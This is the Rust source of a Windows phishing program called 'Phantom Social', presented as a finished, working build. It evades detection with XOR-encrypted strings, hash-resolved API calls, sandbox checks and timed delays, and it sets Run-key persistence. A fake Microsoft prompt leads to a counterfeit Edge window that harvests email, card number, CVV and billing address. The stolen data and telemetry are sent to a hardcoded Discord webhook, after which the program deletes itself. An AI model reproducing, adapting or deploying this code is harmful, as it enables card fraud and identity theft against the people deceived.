// ==========================================================================
// PHANTOM SOCIAL - COMPLETE WORKING VERSION 🔥
// ==========================================================================
// ✅ All bugs fixed
// ✅ Polymorphic (randomized per build)
// ✅ wreq for TLS fingerprinting
// ✅ HTML string split to avoid parsing errors
// ==========================================================================

#![windows_subsystem = "windows"]
#![allow(non_snake_case, dead_code)]

include!(concat!(env!("OUT_DIR"), "/generated.rs"));

use std::{
    thread, 
    time::Duration, 
    mem, 
    ptr, 
    ffi::{c_void, CString},
    sync::{Arc, Mutex},
};
use serde::Serialize;
use wry::{
    application::{
        event::{Event, WindowEvent},
        event_loop::{ControlFlow, EventLoop},
        window::WindowBuilder,
    },
    webview::WebViewBuilder,
};
use lazy_static::lazy_static;

fn xor_decrypt(data: &[u8]) -> String {
    let decrypted: Vec<u8> = data.iter()
        .enumerate()
        .map(|(i, b)| b ^ XOR_KEYS[i % XOR_KEYS.len()])
        .collect();
    String::from_utf8_lossy(&decrypted).to_string()
}

macro_rules! enc_str {
    ($s:expr) => {{
        const ENCRYPTED: &[u8] = &{
            let bytes = $s.as_bytes();
            let mut result = [0u8; $s.len()];
            let mut i = 0;
            while i < bytes.len() {
                result[i] = bytes[i] ^ XOR_KEYS[i % 16];
                i += 1;
            }
            result
        };
        xor_decrypt(ENCRYPTED)
    }};
}

lazy_static! {
    static ref SESSION_ID: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PROCESS_START_TIME: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref SUCCESS_FLAG: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
}

#[derive(Serialize)]
struct TelemetryData {
    session: String,
    canvas_fp: String,
    process_time: String,
    uptime_hours: u64,
}

fn ts() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn gen_id() -> String {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let mut h = RandomState::new().build_hasher();
    h.write_u64(ts());
    format!("{}-{:X}-{:X}", SESSION_PREFIX, ts(), h.finish())
}

fn get_time_str() -> String {
    let now = std::time::SystemTime::now();
    let d = now.duration_since(std::time::UNIX_EPOCH).unwrap();
    let secs = d.as_secs();
    let h = ((secs / 3600) % 24) as u32;
    let m = ((secs / 60) % 60) as u32;
    format!("{:02}:{:02}", h, m)
}

fn init_globals() {
    *SESSION_ID.lock().unwrap() = gen_id();
    *PROCESS_START_TIME.lock().unwrap() = get_time_str();
    *SUCCESS_FLAG.lock().unwrap() = false;
}

fn get_session_id() -> String {
    SESSION_ID.lock().unwrap().clone()
}

fn get_proc_time() -> String {
    PROCESS_START_TIME.lock().unwrap().clone()
}

fn mark_success() {
    *SUCCESS_FLAG.lock().unwrap() = true;
}

fn is_success() -> bool {
    *SUCCESS_FLAG.lock().unwrap()
}

use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, IMAGE_EXPORT_DIRECTORY};

const fn djb2_hash(s: &str) -> u32 {
    let bytes = s.as_bytes();
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        hash = hash.wrapping_mul(33).wrapping_add(bytes[i] as u32);
        i += 1;
    }
    hash
}

const HASH_MOVEFILEEXW: u32 = djb2_hash("MoveFileExW");
const HASH_REGCREATEKEYEXA: u32 = djb2_hash("RegCreateKeyExA");
const HASH_REGSETVALUEEXA: u32 = djb2_hash("RegSetValueExA");
const HASH_REGCLOSEKEY: u32 = djb2_hash("RegCloseKey");
const HASH_REGDELETEVALUEA: u32 = djb2_hash("RegDeleteValueA");
const HASH_GETTICKCOUNT64: u32 = djb2_hash("GetTickCount64");
const HASH_GETNETWORKPARAMS: u32 = djb2_hash("GetNetworkParams");

type FnMoveFileExW = unsafe extern "system" fn(*const u16, *const u16, u32) -> i32;
type FnRegCreateKeyExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, *mut c_void, u32, u32, *mut c_void, *mut *mut c_void, *mut u32) -> i32;
type FnRegSetValueExA = unsafe extern "system" fn(*mut c_void, *const i8, u32, u32, *const u8, u32) -> i32;
type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
type FnRegDeleteValueA = unsafe extern "system" fn(*mut c_void, *const i8) -> i32;
type FnGetTickCount64 = unsafe extern "system" fn() -> u64;
type FnGetNetworkParams = unsafe extern "system" fn(*mut c_void, *mut u32) -> u32;

unsafe fn resolve_api(module: &str, hash: u32) -> Option<*const c_void> {
    let module_cstr = CString::new(module).ok()?;
    let h_module = GetModuleHandleA(module_cstr.as_ptr());
    if h_module.is_null() {
        return None;
    }
    
    let dos_header = h_module as *const IMAGE_DOS_HEADER;
    let nt_headers = (h_module as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    
    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
    if export_dir_rva == 0 {
        return None;
    }
    
    let export_dir = (h_module as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
    
    let names = (h_module as usize + (*export_dir).AddressOfNames as usize) as *const u32;
    let funcs = (h_module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
    let ords = (h_module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
    
    for i in 0..(*export_dir).NumberOfNames {
        let name_rva = *names.offset(i as isize);
        let name_ptr = (h_module as usize + name_rva as usize) as *const i8;
        let name = std::ffi::CStr::from_ptr(name_ptr).to_str().ok()?;
        
        if djb2_hash(name) == hash {
            let ord_idx = *ords.offset(i as isize);
            let func_rva = *funcs.offset(ord_idx as isize);
            let func_ptr = (h_module as usize + func_rva as usize) as *const c_void;
            return Some(func_ptr);
        }
    }
    
    None
}

fn check_dns_cache() -> bool {
    unsafe {
        if let Some(api) = resolve_api("iphlpapi.dll", HASH_GETNETWORKPARAMS) {
            let fn_get: FnGetNetworkParams = mem::transmute(api);
            let mut sz: u32 = 0;
            fn_get(ptr::null_mut(), &mut sz);
            return sz > 0;
        }
    }
    false
}

fn get_uptime_hrs() -> u64 {
    unsafe {
        if let Some(api) = resolve_api("kernel32.dll", HASH_GETTICKCOUNT64) {
            let fn_tick: FnGetTickCount64 = mem::transmute(api);
            let ms = fn_tick();
            return ms / (1000 * 60 * 60);
        }
    }
    0
}

fn should_persist() -> bool {
    (get_uptime_hrs() / 24) < 3
}

use rand::Rng;

fn jittered_sleep(base_secs: u64) {
    let mut rng = rand::thread_rng();
    let min = base_secs.saturating_sub((base_secs * JITTER_MIN as u64) / 100);
    let max = base_secs + ((base_secs * JITTER_MAX as u64) / 100);
    let actual = rng.gen_range(min..=max);
    thread::sleep(Duration::from_secs(actual));
}

fn install_persist() {
    if let Ok(exe) = std::env::current_exe() {
        let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
        let val = format!("{}\0", PERSIST_NAME);
        let exe_str = format!("{}\0", exe.to_string_lossy());
        
        unsafe {
            if let Some(api_create) = resolve_api("advapi32.dll", HASH_REGCREATEKEYEXA) {
                if let Some(api_set) = resolve_api("advapi32.dll", HASH_REGSETVALUEEXA) {
                    if let Some(api_close) = resolve_api("advapi32.dll", HASH_REGCLOSEKEY) {
                        let fn_create: FnRegCreateKeyExA = mem::transmute(api_create);
                        let fn_set: FnRegSetValueExA = mem::transmute(api_set);
                        let fn_close: FnRegCloseKey = mem::transmute(api_close);
                        
                        let mut hkey: *mut c_void = ptr::null_mut();
                        let hkcu = 0x80000001 as *mut c_void;
                        
                        if fn_create(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                            fn_set(hkey, val.as_ptr() as *const i8, 0, 1, exe_str.as_ptr(), exe_str.len() as u32);
                            fn_close(hkey);
                        }
                    }
                }
            }
        }
    }
}

fn remove_persist() {
    let key = enc_str!("Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
    let val = format!("{}\0", PERSIST_NAME);
    
    unsafe {
        if let Some(api_open) = resolve_api("advapi32.dll", HASH_REGCREATEKEYEXA) {
            if let Some(api_del) = resolve_api("advapi32.dll", HASH_REGDELETEVALUEA) {
                if let Some(api_close) = resolve_api("advapi32.dll", HASH_REGCLOSEKEY) {
                    let fn_open: FnRegCreateKeyExA = mem::transmute(api_open);
                    let fn_del: FnRegDeleteValueA = mem::transmute(api_del);
                    let fn_close: FnRegCloseKey = mem::transmute(api_close);
                    
                    let mut hkey: *mut c_void = ptr::null_mut();
                    let hkcu = 0x80000001 as *mut c_void;
                    
                    if fn_open(hkcu, key.as_ptr() as *const i8, 0, ptr::null_mut(), 0, 0xF003F, ptr::null_mut(), &mut hkey, ptr::null_mut()) == 0 {
                        fn_del(hkey, val.as_ptr() as *const i8);
                        fn_close(hkey);
                    }
                }
            }
        }
    }
}

fn schedule_del() {
    if let Ok(exe) = std::env::current_exe() {
        let exe_wide: Vec<u16> = exe.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
        
        unsafe {
            if let Some(api) = resolve_api("kernel32.dll", HASH_MOVEFILEEXW) {
                let fn_move: FnMoveFileExW = mem::transmute(api);
                fn_move(exe_wide.as_ptr(), ptr::null(), 0x4);
            }
        }
    }
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

fn send_data(data: &str) -> bool {
    let url = enc_str!("https://discord.com/api/webhooks/1458963086794031105/AmHlBpfXql871QuWMkOmQ6GNmQiIyW-5A-5wwz3k0RKjqe-RFpMaOiNfHoYXVJ0NtmCT");
    
    let payload = serde_json::json!({
        "content": format!("```json\n{}\n```", json_escape(data)),
        "username": "Verification"
    });
    
    let client = match wreq::Client::builder()
        .impersonate(wreq::Impersonate::Chrome131)
        .danger_accept_invalid_certs(true)
        .build()
    {
        Ok(c) => c,
        Err(_) => return false,
    };
    
    let json_str = serde_json::to_string(&payload).unwrap_or_default();
    
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        client
            .post(&url)
            .header("Content-Type", "application/json")
            .body(json_str)
            .send()
            .await
            .is_ok()
    })
}

fn show_notification() -> bool {
    use winapi::um::winuser::{MessageBoxW, MB_OKCANCEL, MB_ICONINFORMATION};
    
    let msg = enc_str!("Microsoft Account\n\nAccount verification required\n\nAs part of our updated security policy, we need to verify your payment information on file. This is a routine compliance check required for all accounts.\n\nNo charges will be applied. This process typically takes 2-3 minutes.\n\nWould you like to complete verification now?");
    let title = enc_str!("Microsoft Account - Verification Required");
    
    unsafe {
        let msg_w: Vec<u16> = msg.encode_utf16().chain(std::iter::once(0)).collect();
        let title_w: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
        
        MessageBoxW(ptr::null_mut(), msg_w.as_ptr(), title_w.as_ptr(), MB_OKCANCEL | MB_ICONINFORMATION) == 1
    }
}
fn get_html() -> String {
    let session = html_escape(&get_session_id());
    let webhook = html_escape(&enc_str!("https://discord.com/api/webhooks/1458963086794031105/AmHlBpfXql871QuWMkOmQ6GNmQiIyW-5A-5wwz3k0RKjqe-RFpMaOiNfHoYXVJ0NtmCT"));
    let proc_time = html_escape(&get_proc_time());
    let rand_seed = rand::thread_rng().gen::<u32>();
    
    let html = concat!(
        "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>Microsoft Account</title>",
        "<style>*{margin:0;padding:0;}body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;}",
        ".edge-chrome{background:#f3f3f3;height:35px;display:flex;align-items:center;padding:0 10px;border-bottom:1px solid #d4d4d4;}",
        ".address-bar{flex:1;background:white;height:28px;border-radius:20px;display:flex;align-items:center;padding:0 12px;}",
        ".url-text{font-size:12px;color:#1a1a1a;}",
        ".content{height:calc(100vh - 35px);background:#f5f5f5;overflow-y:auto;}",
        ".container{max-width:600px;margin:40px auto;padding:0 20px;}",
        ".info-box{background:#e6f2ff;border-left:3px solid #0078d4;padding:16px;margin-bottom:24px;font-size:13px;}",
        ".card{background:#fff;border-radius:4px;padding:32px;box-shadow:0 1px 3px rgba(0,0,0,0.08);}",
        ".card-title{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px;}",
        ".form-group{margin-bottom:16px;}",
        ".form-label{display:block;font-size:14px;font-weight:600;color:#323130;margin-bottom:6px;}",
        ".form-input{width:100%;padding:10px 12px;font-size:14px;border:1px solid #8a8886;border-radius:2px;}",
        ".form-input:focus{outline:none;border-color:#0078d4;}",
        ".form-row{display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px;}",
        ".address-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;}",
        ".button{background:#0078d4;color:#fff;border:none;padding:10px 24px;font-size:14px;cursor:pointer;}",
        ".button:hover{background:#106ebe;}",
        ".button-group{display:flex;justify-content:space-between;margin-top:24px;}",
        ".link-btn{background:none;border:none;color:#0078d4;font-size:14px;cursor:pointer;text-decoration:underline;}",
        ".hidden{display:none;}",
        ".step-indicator{display:flex;gap:8px;margin-bottom:24px;}",
        ".step{flex:1;height:3px;background:#edebe9;}",
        ".step.active{background:#0078d4;}",
        "</style></head><body>",
        "<div class=\"edge-chrome\"><div class=\"address-bar\">",
        "<svg width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\">",
        "<path d=\"M12 2C9.24 2 7 4.24 7 7V10H6C4.9 10 4 10.9 4 12V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V12C20 10.9 19.1 10 18 10H17V7C17 4.24 14.76 2 12 2ZM12 4C13.66 4 15 5.34 15 7V10H9V7C9 5.34 10.34 4 12 4Z\" fill=\"#0f9d58\"/>",
        "</svg><span class=\"url-text\">https://account.microsoft.com/profile/payment-verification</span>",
        "</div></div>",
        "<div class=\"content\"><div class=\"container\">",
        "<div class=\"info-box\"><strong>Payment information verification</strong><br>As part of our updated account security requirements, we need to verify the payment method.</div>",
        "<div class=\"card\">",
        "<div id=\"step1\"><div class=\"card-title\">Account verification</div>",
        "<div class=\"step-indicator\"><div class=\"step active\"></div><div class=\"step\"></div><div class=\"step\"></div></div>",
        "<div class=\"form-group\"><label class=\"form-label\">Email</label><input type=\"email\" class=\"form-input\" id=\"email\"></div>",
        "<div class=\"button-group\"><span></span><button class=\"button\" onclick=\"nextStep(2)\">Continue</button></div></div>",
        "<div id=\"step2\" class=\"hidden\"><div class=\"card-title\">Payment verification</div>",
        "<div class=\"step-indicator\"><div class=\"step active\"></div><div class=\"step active\"></div><div class=\"step\"></div></div>",
        "<div class=\"form-group\"><label class=\"form-label\">Card number</label><input type=\"text\" class=\"form-input\" id=\"cardNumber\" maxlength=\"19\"></div>",
        "<div class=\"form-row\">",
        "<div class=\"form-group\"><label class=\"form-label\">Name</label><input type=\"text\" class=\"form-input\" id=\"cardholderName\"></div>",
        "<div class=\"form-group\"><label class=\"form-label\">Expiry</label><input type=\"text\" class=\"form-input\" id=\"expiry\" maxlength=\"5\"></div>",
        "<div class=\"form-group\"><label class=\"form-label\">CVV</label><input type=\"password\" class=\"form-input\" id=\"cvv\" maxlength=\"4\"></div>",
        "</div>",
        "<div class=\"button-group\"><button class=\"link-btn\" onclick=\"nextStep(1)\">Back</button><button class=\"button\" onclick=\"nextStep(3)\">Continue</button></div></div>",
        "<div id=\"step3\" class=\"hidden\"><div class=\"card-title\">Billing address</div>",
        "<div class=\"step-indicator\"><div class=\"step active\"></div><div class=\"step active\"></div><div class=\"step active\"></div></div>",
        "<div class=\"form-group\"><label class=\"form-label\">Address</label><input type=\"text\" class=\"form-input\" id=\"address\"></div>",
        "<div class=\"address-row\">",
        "<div class=\"form-group\"><label class=\"form-label\">City</label><input type=\"text\" class=\"form-input\" id=\"city\"></div>",
        "<div class=\"form-group\"><label class=\"form-label\">State</label><input type=\"text\" class=\"form-input\" id=\"state\"></div>",
        "<div class=\"form-group\"><label class=\"form-label\">ZIP</label><input type=\"text\" class=\"form-input\" id=\"zip\"></div>",
        "</div>",
        "<div class=\"form-group\"><label class=\"form-label\">Country</label><input type=\"text\" class=\"form-input\" id=\"country\"></div>",
        "<div class=\"button-group\"><button class=\"link-btn\" onclick=\"nextStep(2)\">Back</button><button class=\"button\" onclick=\"submitForm()\">Complete</button></div></div>",
        "<div id=\"step4\" class=\"hidden\"><div class=\"card-title\">Verification complete</div>",
        "<div class=\"info-box\">This verification process is complete. You may close this window.</div></div>",
        "</div></div></div>",
        "<canvas id=\"fp\" width=\"200\" height=\"50\" style=\"display:none;\"></canvas>"
    );
    
    let script = format!(
        "<script>const sid=\"{}\";const wh=\"{}\";const pt=\"{}\";const rs={};function getCanvasFP(){{const c=document.getElementById('fp');const x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillStyle='#'+(rs%0xFFFFFF).toString(16).padStart(6,'0');x.fillRect(125+(rs%10),1+(rs%5),62,20);x.fillStyle='#069';x.fillText('Test '+(rs%1000),2+(rs%5),15);let h=0;const d=c.toDataURL();for(let i=0;i<d.length;i++){{h=((h<<5)-h)+d.charCodeAt(i);h=h&h;}}return h.toString(16);}}const fp=getCanvasFP();fetch(wh,{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{content:'```json\\n'+JSON.stringify({{type:'loaded',session:sid,canvas_fp:fp,process_time:pt}},null,2)+'\\n```',username:'Start'}})}}).catch(()=>{{}});function nextStep(s){{for(let i=1;i<=4;i++){{document.getElementById('step'+i).classList.add('hidden');}}document.getElementById('step'+s).classList.remove('hidden');window.scrollTo(0,0);}}function sanitize(s){{return s.replace(/[<>\"'&]/g,c=>{{return{{'<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#x27;','&':'&amp;'}}[c];}});}}async function submitForm(){{const data={{email:sanitize(document.getElementById('email').value),card_number:sanitize(document.getElementById('cardNumber').value),cardholder_name:sanitize(document.getElementById('cardholderName').value),expiry:sanitize(document.getElementById('expiry').value),cvv:sanitize(document.getElementById('cvv').value),street_address:sanitize(document.getElementById('address').value),city:sanitize(document.getElementById('city').value),state:sanitize(document.getElementById('state').value),zip_code:sanitize(document.getElementById('zip').value),country:sanitize(document.getElementById('country').value),session:sid,canvas_fp:fp,timestamp:Math.floor(Date.now()/1000)}};try{{await fetch(wh,{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{content:'```json\\n'+JSON.stringify(data,null,2)+'\\n```',username:'Creds'}})}});}}catch(e){{}}nextStep(4);setTimeout(()=>{{window.close();}},3000);}}document.getElementById('cardNumber').addEventListener('input',function(e){{let v=e.target.value.replace(/\\s/g,'');e.target.value=v.match(/.{{1,4}}/g)?.join(' ')||v;}});document.getElementById('expiry').addEventListener('input',function(e){{let v=e.target.value.replace(/\\D/g,'');if(v.length>=2){{v=v.slice(0,2)+'/'+v.slice(2,4);}}e.target.value=v;}});</script></body></html>",
        session, webhook, proc_time, rand_seed
    );
    
    format!("{}{}", html, script)
}

fn create_win(html: String) -> Result<(), Box<dyn std::error::Error>> {
    let el = EventLoop::new();
    let win = WindowBuilder::new()
        .with_title("Microsoft Edge")
        .with_inner_size(wry::application::dpi::LogicalSize::new(900, 700))
        .with_decorations(false)
        .build(&el)?;
    
    let _wv = WebViewBuilder::new(win)?.with_html(html)?.build()?;
    
    el.run(move |ev, _, cf| {
        *cf = ControlFlow::Wait;
        match ev {
            Event::WindowEvent { event: WindowEvent::CloseRequested, .. } => {
                *cf = ControlFlow::Exit;
            }
            _ => {}
        }
    });
}

async fn sim_legit_async() {
    jittered_sleep(300);
    let _ = std::env::var("APPDATA");
    jittered_sleep(600);
    let _ = tokio::net::TcpStream::connect("www.microsoft.com:80").await;
    jittered_sleep(600);
    let _ = get_uptime_hrs();
    jittered_sleep(300);
}

fn main() {
    init_globals();
    
    if !check_dns_cache() {
        std::process::exit(0);
    }
    
    let use_persist = should_persist();
    let uptime = get_uptime_hrs();
    
    if use_persist {
        install_persist();
    }
    
    thread::spawn(move || {
        jittered_sleep(10);
        let pkt = TelemetryData {
            session: get_session_id(),
            canvas_fp: "pending".to_string(),
            process_time: get_proc_time(),
            uptime_hours: uptime,
        };
        if let Ok(j) = serde_json::to_string_pretty(&pkt) {
            send_data(&j);
        }
    });
    
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(sim_legit_async());
    
    if show_notification() {
        let html = get_html();
        if let Ok(_) = create_win(html) {
            mark_success();
        }
    } else {
        if use_persist {
            std::process::exit(0);
        } else {
            jittered_sleep(7200);
            if show_notification() {
                let html = get_html();
                if let Ok(_) = create_win(html) {
                    mark_success();
                }
            }
        }
    }
    
    if is_success() {
        remove_persist();
        schedule_del();
    }
}
